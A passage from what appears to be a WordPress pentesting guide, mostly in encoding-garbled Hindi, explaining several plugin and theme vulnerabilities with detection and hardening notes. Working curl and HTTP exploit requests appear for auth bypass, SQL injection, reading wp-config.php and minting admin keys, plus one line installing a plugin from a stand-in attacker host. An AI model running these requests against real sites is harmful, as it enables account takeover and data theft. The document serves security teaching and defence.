- рдпрджрд┐ рдХрд┐рд╕реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ higher privileges рдкрд╣рд▓реЗ `_asenha_view_admin_as_original_roles` рдореЗрдВ рд╕рд╣реЗрдЬреЗ рдЧрдП рдереЗ рдФрд░ рдЙрдиреНрд╣реЗрдВ downgraded рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛ, рддреЛ рд╡реЗ reset path рдкрд░ рдЬрд╛рдХрд░ рдЙрдиреНрд╣реЗрдВ рдкреБрдирд░реНрд╕реНрдерд╛рдкрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
- рдХреБрдЫ deployments рдореЗрдВ, рдХреЛрдИ рднреА authenticated рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд┐рд╕реА рдЕрдиреНрдп username рдХреЗ рд▓рд┐рдП reset рдЯреНрд░рд┐рдЧрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рдЕрднреА рднреА `viewing_admin_as_role_are` рдореЗрдВ рдореМрдЬреВрдж рд╣реИ (broken authorization).

Exploitation (example)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
On vulnerable builds this removes current roles and re-adds the saved original roles (e.g., `administrator`), effectively escalating privileges.

Detection checklist

- рдЙрди role-switching рдлреАрдЪрд░реНрд╕ рдХреА рддрд▓рд╛рд╢ рдХрд░реЗрдВ рдЬреЛ user meta рдореЗрдВ тАЬoriginal rolesтАЭ рдХреЛ рд╕реНрдерд╛рдпреА рд░реВрдк рд╕реЗ рд╕реЗрд╡ рдХрд░рддреЗ рд╣реИрдВ (рдЙрджрд╛., `_asenha_view_admin_as_original_roles`)ред
- рдРрд╕реЗ reset/restore paths рдкрд╣рдЪрд╛рдиреЗрдВ рдЬреЛ:
  - `$_REQUEST` / `$_GET` / `$_POST` рд╕реЗ usernames рдкрдврд╝рддреЗ рд╣реИрдВред
  - рдмрд┐рдирд╛ `current_user_can()` рдФрд░ `wp_verify_nonce()` / `check_admin_referer()` рдХреЗ `add_role()` / `remove_role()` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ roles рдмрджрд▓рддреЗ рд╣реИрдВред
  - actor рдХреА capabilities рдХреЗ рдмрдЬрд╛рдп plugin option array (рдЙрджрд╛., `viewing_admin_as_role_are`) рдХреЗ рдЖрдзрд╛рд░ рдкрд░ authorize рдХрд░рддреЗ рд╣реИрдВред

---

### Unauthenticated privilege escalation via cookieтАСtrusted user switching on public init (Service Finder тАЬsf-bookingтАЭ)

Some plugins wire user-switching helpers to the public `init` hook and derive identity from a client-controlled cookie. If the code calls `wp_set_auth_cookie()` without verifying authentication, capability and a valid nonce, any unauthenticated visitor can force login as an arbitrary user ID.

Typical vulnerable pattern (simplified from Service Finder Bookings тЙд 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // ЁЯФе sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
рдпрд╣ рдХреНрдпреЛрдВ рд╢реЛрд╖рдг рдпреЛрдЧреНрдп рд╣реИ

- рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ `init` hook рд╣реИрдВрдбрд▓рд░ рдХреЛ рдЕрдкреНрд░рдорд╛рдгреАрдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдкрд╣реБрдБрдЪ рдпреЛрдЧреНрдп рдмрдирд╛рддрд╛ рд╣реИ (рдХреЛрдИ `is_user_logged_in()` рдЧрд╛рд░реНрдб рдирд╣реАрдВ)ред
- рдкрд╣рдЪрд╛рди рдХреНрд▓рд╛рдЗрдВрдЯ-рдкрд░рд┐рд╡рд░реНрддрдиреАрдп рдХреБрдХреА (`original_user_id`) рд╕реЗ рд▓реА рдЬрд╛рддреА рд╣реИред
- рд╕реАрдзрд╛ рдХреЙрд▓ `wp_set_auth_cookie($uid)` рдЕрдиреБрд░реЛрдзрдХрд░реНрддрд╛ рдХреЛ рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЙрдЧ рдЗрди рдХрд░ рджреЗрддрд╛ рд╣реИ рдмрд┐рдирд╛ рдХрд┐рд╕реА capability/nonce checks рдХреЗред

рд╢реЛрд╖рдг (рдЕрдкреНрд░рдорд╛рдгреАрдХреГрдд)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF considerations for WordPress/plugin CVEs

Generic edge/server WAFs рд╡реНрдпрд╛рдкрдХ рдкреИрдЯрд░реНрди (SQLi, XSS, LFI) рдХреЗ рд▓рд┐рдП рдЯреНрдпреВрди рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред рдХрдИ рдЙрдЪреНрдЪ-рдкреНрд░рднрд╛рд╡ рд╡рд╛рд▓реЗ WordPress/plugin рджреЛрд╖ рдЕрдиреБрдкреНрд░рдпреЛрдЧ-рд╡рд┐рд╢рд┐рд╖реНрдЯ рд▓реЙрдЬрд┐рдХ/рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдмрдЧ рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ рдЗрдВрдЬрди WordPress routes рдФрд░ plugin semantics рдХреЛ рд╕рдордЭреЗ рдмрд┐рдирд╛ рд╡реИрдз рдЯреНрд░реИрдлрд╝рд┐рдХ рдЬреИрд╕рд╛ рджрд┐рдЦрддреЗ рд╣реИрдВред

Offensive notes

- plugin-рд╡рд┐рд╢рд┐рд╖реНрдЯ endpoints рдХреЛ clean payloads рдХреЗ рд╕рд╛рде рд▓рдХреНрд╖рд┐рдд рдХрд░реЗрдВ: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- рдкрд╣рд▓реЗ unauth paths рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░реЗрдВ (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). Default payloads рдЕрдХреНрд╕рд░ рдмрд┐рдирд╛ obfuscation рдХреЗ рд╕рдлрд▓ рд╣реЛ рдЬрд╛рддреЗ рд╣реИрдВред
- рдЖрдо рдЙрдЪреНрдЪ-рдкреНрд░рднрд╛рд╡ рдорд╛рдорд▓реЗ: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Defensive notes

- Generic WAF signatures рдкрд░ plugin CVEs рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдХреЗ рд▓рд┐рдП рднрд░реЛрд╕рд╛ рди рдХрд░реЗрдВред application-layer, vulnerability-specific virtual patches рд▓рд╛рдЧреВ рдХрд░реЗрдВ рдпрд╛ рдЬрд▓реНрджреА рдЕрдкрдбреЗрдЯ рдХрд░реЗрдВред
- рдХреЛрдб рдореЗрдВ negative regex filters рдХреА рддреБрд▓рдирд╛ рдореЗрдВ positive-security checks (capabilities, nonces, strict input validation) рдХреЛ рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рджреЗрдВред

## WordPress Protection

### рдирд┐рдпрдорд┐рдд рдЕрдкрдбреЗрдЯ

рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ WordPress, plugins, рдФрд░ themes рдЕрдкрдбреЗрдЯреЗрдб рд╣реИрдВред рд╕рд╛рде рд╣реА рдкреБрд╖реНрдЯрд┐ рдХрд░реЗрдВ рдХрд┐ automated updating wp-config.php рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реИ:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, **рдХреЗрд╡рд▓ рднрд░реЛрд╕реЗрдордВрдж WordPress plugins рдФрд░ themes рд╣реА рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░реЗрдВред**

### рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд▓рдЧрдЗрдиреНрд╕

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **рдЕрдиреНрдп рд╕реБрдЭрд╛рд╡**

- рдбрд┐рдлреЙрд▓реНрдЯ **admin** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд╣рдЯрд╛рдПрдБ
- **рдордЬрдмреВрдд рдкрд╛рд╕рд╡рд░реНрдб** рдФрд░ **2FA** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ
- рд╕рдордп-рд╕рдордп рдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА **рдЕрдиреБрдорддрд┐рдпрд╛рдБ** рдХреА **рд╕рдореАрдХреНрд╖рд╛** рдХрд░реЗрдВ
- Brute Force рд╣рдорд▓реЛрдВ рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП **рд▓реЙрдЧрд┐рди рдкреНрд░рдпрд╛рд╕реЛрдВ рдХреЛ рд╕реАрдорд┐рдд рдХрд░реЗрдВ**
- **`wp-admin.php`** рдлрд╛рдЗрд▓ рдХрд╛ рдирд╛рдо рдмрджрд▓реЗрдВ рдФрд░ рдХреЗрд╡рд▓ рдЖрдВрддрд░рд┐рдХ рд░реВрдк рд╕реЗ рдпрд╛ рдХреБрдЫ рдирд┐рд╢реНрдЪрд┐рдд IP рдкрддреЛрдВ рд╕реЗ рд╣реА рдПрдХреНрд╕реЗрд╕ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдВред

### Unauthenticated SQL Injection via insufficient validation (WP Job Portal <= 2.3.2)

WP Job Portal recruitment plugin рдиреЗ рдПрдХ **savecategory** рдЯрд╛рд╕реНрдХ рдЙрдЬрд╛рдЧрд░ рдХрд┐рдпрд╛ рдЬреЛ рдЕрдВрддрддрдГ `modules/category/model.php::validateFormData()` рдХреЗ рдЕрдВрджрд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддрд╛ рд╣реИ:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat тЬЧ
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Issues introduced by this snippet:

1. **Unsanitised user input** тАУ `parentid` рд╕реАрдзреЗ HTTP request рд╕реЗ рдЖрддрд╛ рд╣реИред
2. **String concatenation inside the WHERE clause** тАУ рдХреЛрдИ `is_numeric()` / `esc_sql()` / prepared statement рдирд╣реАрдВред
3. **Unauthenticated reachability** тАУ рд╣рд╛рд▓рд╛рдВрдХрд┐ action `admin-post.php` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ execute рд╣реЛрддрд╛ рд╣реИ, рдкрд░ рдореМрдЬреВрджхФпф╕А рдЬрд╛рдБрдЪ рдПрдХ **CSRF nonce** (`wp_verify_nonce()`) рд╣реИ, рдЬрд┐рд╕реЗ рдХреЛрдИ рднреА рд╡рд┐рдЬрд╝рд┐рдЯрд░ public рдкреЗрдЬ рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ shortcode `[wpjobportal_my_resumes]` рдПрдореНрдмреЗрдб рдХрд░рддрд╛ рд╣реИред

#### Exploitation

1. рдПрдХ рддрд╛рдЬрд╝рд╛ nonce рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. `parentid` рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ arbitrary SQL рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░реЗрдВ:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
Response рдЗрдВрдЬреЗрдХреНрдЯ рдХрд┐рдП рдЧрдП рдХреНрд╡реЗрд░реА рдХрд╛ рдкрд░рд┐рдгрд╛рдо рдЙрдЬрд╛рдЧрд░ рдХрд░рддрд╛ рд╣реИ рдпрд╛ рдбреЗрдЯрд╛рдмреЗрд╕ рдмрджрд▓ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ SQLi рдкреНрд░рдорд╛рдгрд┐рдд рд╣реЛрддрд╛ рд╣реИред


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

рдПрдХ рдЕрдиреНрдп рдЯрд╛рд╕реНрдХ, **downloadcustomfile**, рд╡рд┐рдЬрд╝рд┐рдЯрд░ рдХреЛ path traversal рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдбрд┐рд╕реНрдХ рд╕реЗ **рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓** рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рдерд╛ред рдХрдордЬреЛрд░ sink рд╕реНрдерд┐рдд рд╣реИ `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рд╣реИ рдФрд░ **рд╕реИрдирд┐рдЯрд╛рдЗрдЬрд╝реЗрд╢рди рдХреЗ рдмрд┐рдирд╛** рд╕рдВрдпреЛрдЬрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред  рдлрд┐рд░ рд╕реЗ, рдПрдХрдорд╛рддреНрд░ рдмрд╛рдзрд╛ **CSRF nonce** рд╣реИ рдЬрд┐рд╕реЗ resume рдкреГрд╖реНрда рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
The server responds with the contents of `wp-config.php`, leaking DB credentials and auth keys.

## рдЕрдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд┐рдП рдмрд┐рдирд╛ account takeover via Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

рдХрдИ themes/plugins "social login" helpers ship рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ admin-ajax.php рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХреНрд╕рдкреЛрдЬрд╝ рд╣реЛрддреЗ рд╣реИрдВред рдЕрдЧрд░ рдПрдХ unauthenticated AJAX action (wp_ajax_nopriv_...) client-supplied identifiers рдкрд░ рднрд░реЛрд╕рд╛ рдХрд░рддрд╛ рд╣реИ рдЬрдм provider data рдЕрдиреБрдкрд╕реНрдерд┐рдд рд╣реЛ рдФрд░ рдлрд┐рд░ wp_set_auth_cookie() рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдПрдХ рдкреВрд░рд╛ authentication bypass рдмрди рдЬрд╛рддрд╛ рд╣реИред

Typical flawed pattern (simplified)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider тАУ execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // ЁЯФе logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
рдпрд╣ рд╢реЛрд╖рдгреАрдп рдХреНрдпреЛрдВ рд╣реИ

- admin-ajax.php рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ unauthenticated рдкрд╣реБрдБрдЪ (wp_ajax_nopriv_тАж action)ред
- state change рд╕реЗ рдкрд╣рд▓реЗ рдХреЛрдИ nonce/capability рдЪреЗрдХ рдирд╣реАрдВ рд╣реИред
- OAuth/OpenID provider рд╕рддреНрдпрд╛рдкрди рдЕрдиреБрдкрд╕реНрдерд┐рдд рд╣реИ; default branch attacker рдЗрдирдкреБрдЯ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░ рд▓реЗрддрд╛ рд╣реИред
- get_user_by('email', $_POST['id']) рдХреЗ рдмрд╛рдж wp_set_auth_cookie($uid) рдХреЙрд▓ рдХрд░рдиреЗ рд╕реЗ requester рдХреЛ рдХрд┐рд╕реА рднреА рдореМрдЬреВрдж email address рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░ рджреЗрддрд╛ рд╣реИред

Exploitation (unauthenticated)

- рдкреВрд░реНрд╡рд╛рдкреЗрдХреНрд╖рд╛рдПрдБ: attacker /wp-admin/admin-ajax.php рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдХрд┐рд╕реА рд╡реИрдз рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдИрдореЗрд▓ рдХреЛ рдЬрд╛рдирддрд╛/рдЕрдиреБрдорд╛рди рд▓рдЧрд╛ рд╕рдХрддрд╛ рд╣реИред
- provider рдХреЛ рдПрдХ unsupported value рдкрд░ рд╕реЗрдЯ рдХрд░реЗрдВ (рдпрд╛ рдЗрд╕реЗ рдЫреЛрдбрд╝ рджреЗрдВ) рддрд╛рдХрд┐ default branch рдкрд░ рдЬрд╛рдПрдБ рдФрд░ id=<victim_email> рдкрд╛рд╕ рдХрд░реЗрдВред
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Expected success indicators

- HTTP 200 with JSON body like {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* for the victim user; subsequent requests are authenticated.

Finding the action name

- Inspect the theme/plugin for add_action('wp_ajax_nopriv_...', '...') registrations in social login code (e.g., framework/add-ons/social-login/class-social-login.php).
- Grep for wp_set_auth_cookie(), get_user_by('email', ...) inside AJAX handlers.

Detection checklist

- Web logs showing unauthenticated POSTs to /wp-admin/admin-ajax.php with the social-login action and id=<email>.
- 200 responses with the success JSON immediately preceding authenticated traffic from the same IP/User-Agent.

Hardening

- рдХреНрд▓рд╛рдЗрдВрдЯ рдЗрдирдкреБрдЯ рд╕реЗ рдкрд╣рдЪрд╛рди рди рдирд┐рдХрд╛рд▓реЗрдВред рдХреЗрд╡рд▓ validated provider token/ID рд╕реЗ рдЙрддреНрдкрдиреНрди emails/IDs рд╕реНрд╡реАрдХрд╛рд░ рдХрд░реЗрдВред
- Require CSRF nonces рдФрд░ capability checks рд▓рдЧрд╛рдПрдБ рднрд▓реЗ рд╣реА рд╡реЗ login helpers рд╣реЛрдВ; wp_ajax_nopriv_ рдХреЛ рдХреЗрд╡рд▓ рддрднреА рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд░реЗрдВ рдЬрдм рдмрд┐рд▓реНрдХреБрд▓ рдЬрд╝рд░реВрд░реА рд╣реЛред
- OAuth/OIDC responses рдХреЛ server-side validate рдФрд░ verify рдХрд░реЗрдВ; missing/invalid providers рдХреЛ reject рдХрд░реЗрдВ (POST id рдкрд░ fallback рди рдХрд░реЗрдВ)ред
- рддрдм рддрдХ social login рдЕрд╕реНрдерд╛рдпреА рд░реВрдк рд╕реЗ disable рдХрд░рдиреЗ рдпрд╛ edge рдкрд░ virtual patching (vulnerable action рдХреЛ block рдХрд░рдирд╛) рдкрд░ рд╡рд┐рдЪрд╛рд░ рдХрд░реЗрдВ рдЬрдм рддрдХ fix рди рд╣реЛ рдЬрд╛рдПред

Patched behaviour (Jobmonster 4.8.0)

- Removed the insecure fallback from $_POST['id']; $user_email must originate from verified provider branches in switch($_POST['using']).

## Unauthenticated privilege escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers тЙд 1.0.82)

рдХреБрдЫ plugins рдРрд╕реЗ REST endpoints рдПрдХреНрд╕рдкреЛрдЬрд╝ рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ caller рдХреА capabilities рдХреА рдЬрд╛рдВрдЪ рдХрд┐рдП рдмрд┐рдирд╛ reusable тАЬconnection keysтАЭ рдпрд╛ tokens рдорд┐рдВрдЯ рдХрд░ рджреЗрддреЗ рд╣реИрдВред рдЕрдЧрд░ route рдХреЗрд╡рд▓ рдХрд┐рд╕реА guessable attribute (рдЬреИрд╕реЗ username) рдкрд░ authenticate рдХрд░рддрд╛ рд╣реИ рдФрд░ key рдХреЛ user/session рдХреЗ рд╕рд╛рде capability checks рдХреЗ рд╕рд╛рде bind рдирд╣реАрдВ рдХрд░рддрд╛, рддреЛ рдХреЛрдИ рднреА unauthenticated attacker рдПрдХ key рдорд┐рдВрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ privileged actions (admin account creation, plugin actions тЖТ RCE) рдХреЛ invoke рдХрд░ рд╕рдХрддрд╛ рд╣реИред

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: full takeover by chaining the minted key to internal privileged actions

PoC тАУ mint a connection key and use it
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# тЖТ {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
рдХреНрдпреЛрдВ рдпрд╣ рд╢реЛрд╖рдг рдпреЛрдЧреНрдп рд╣реИ
- рд╕рдВрд╡реЗрджрдирд╢реАрд▓ REST route рдХреЗрд╡рд▓ рдХрдо-рдПрдВрдЯреНрд░реЙрдкреА рдкрд╣рдЪрд╛рди рдкреНрд░рдорд╛рдг (username) рдкрд░ рдирд┐рд░реНрднрд░ рд╣реИ рдпрд╛ permission_callback рдЧрд╛рдпрдм рд╣реИ
- рдХреЛрдИ capability enforcement рдирд╣реАрдВ; minted key рдХреЛ рд╕рд╛рд░реНрд╡рднреМрдорд┐рдХ bypass рдХреЗ рд░реВрдк рдореЗрдВ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░ рд▓рд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ

рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреА рдЪреЗрдХрд▓рд┐рд╕реНрдЯ
- plugin рдХреЛрдб рдореЗрдВ register_rest_route(..., [ 'permission_callback' => '__return_true' ]) рдХреЗ рд▓рд┐рдП grep рдХрд░реЗрдВ
- рдХреЛрдИ рднреА route рдЬреЛ request-supplied identity (username/email) рдХреЗ рдЖрдзрд╛рд░ рдкрд░ tokens/keys рдЬрд╛рд░реА рдХрд░рддрд╛ рд╣реИ, рдмрд┐рдирд╛ рдХрд┐рд╕реА authenticated user рдпрд╛ capability рд╕реЗ рдЬреЛрдбрд╝реЗ
- рдЙрди subsequent routes рдХреЛ рджреЗрдЦреЗрдВ рдЬреЛ server-side capability checks рдХреЗ рдмрд┐рдирд╛ minted token/key рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддреЗ рд╣реИрдВ

рд╣рд╛рд░реНрдбрдирд┐рдВрдЧ
- рдХрд┐рд╕реА рднреА privileged REST route рдХреЗ рд▓рд┐рдП: рдПрдХ permission_callback рдЖрд╡рд╢реНрдпрдХ рд░рдЦреЗрдВ рдЬреЛ required capability рдХреЗ рд▓рд┐рдП current_user_can() рдХреЛ рд▓рд╛рдЧреВ рдХрд░реЗ
- client-supplied identity рд╕реЗ long-lived keys mint рди рдХрд░реЗрдВ; рдпрджрд┐ рдЖрд╡рд╢реНрдпрдХ рд╣реЛ рддреЛ authentication рдХреЗ рдмрд╛рдж short-lived, user-bound tokens рдЬрд╛рд░реА рдХрд░реЗрдВ рдФрд░ рдЙрдкрдпреЛрдЧ рдкрд░ capabilities рдлрд┐рд░ рд╕реЗ рдЬрд╛рдБрдЪреЗрдВ
- рдХреЙрд▓рд░ рдХреЗ user context рдХреЛ validate рдХрд░реЗрдВ (wp_set_current_user рдЕрдХреЗрд▓реЗ рдкрд░реНрдпрд╛рдкреНрдд рдирд╣реАрдВ рд╣реИ) рдФрд░ рдЙрди requests рдХреЛ reject рдХрд░реЗрдВ рдЬрд╣рд╛рдБ !is_user_logged_in() || !current_user_can(<cap>)

---

## Nonce gate рдХреЗ рдЧрд▓рдд рдЙрдкрдпреЛрдЧ тЖТ рдмрд┐рдирд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рдордирдорд╛рдирд╛ plugin рдЗрдВрд╕реНрдЯреЙрд▓реЗрд╢рди (FunnelKit Automations тЙд 3.5.3)

Nonces CSRF рдХреЛ рд░реЛрдХрддреЗ рд╣реИрдВ, authorization рдирд╣реАрдВред рдЕрдЧрд░ рдХреЛрдб nonce рдкрд╛рд╕ рдХреЛ green light рдорд╛рдирдХрд░ privileged operations (e.g., install/activate plugins) рдХреЗ рд▓рд┐рдП capability checks рдЫреЛрдбрд╝ рджреЗрддрд╛ рд╣реИ, рддреЛ рдмрд┐рдирд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╡рд╛рд▓реЗ attackers рдПрдХ рдХрдордЬреЛрд░ nonce рд╢рд░реНрдд рдкреВрд░реА рдХрд░ рдХреЗ backdoored рдпрд╛ vulnerable plugin рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░рдХреЗ RCE рд╣рд╛рд╕рд┐рд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

- Vulnerable path: plugin/install_and_activate
- Flaw: weak nonce hash check; nonce тАЬpassesтАЭ рд╣реЛрдиреЗ рдкрд░ current_user_can('install_plugins'|'activate_plugins') рд▓рд╛рдЧреВ рдирд╣реАрдВ рд╣реЛрддрд╛
- Impact: arbitrary plugin install/activation рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреВрд░реНрдг рд╕рдордЭреМрддрд╛

PoC (shape depends on plugin; illustrative only)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреА рдЪреЗрдХрд▓рд┐рд╕реНрдЯ
- REST/AJAX рд╣реИрдВрдбрд▓рд░ рдЬреЛ plugins/themes рдХреЛ рдХреЗрд╡рд▓ wp_verify_nonce()/check_admin_referer() рдХреЗ рд╕рд╛рде рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдФрд░ capability check рдирд╣реАрдВ рдХрд░рддреЗ
- рдХреЛрдИ рднреА рдХреЛрдб рдкрд╛рде рдЬреЛ nonce validation рдХреЗ рдмрд╛рдж $skip_caps = true рд╕реЗрдЯ рдХрд░рддрд╛ рд╣реИ

рд╣рд╛рд░реНрдбрдирд┐рдВрдЧ
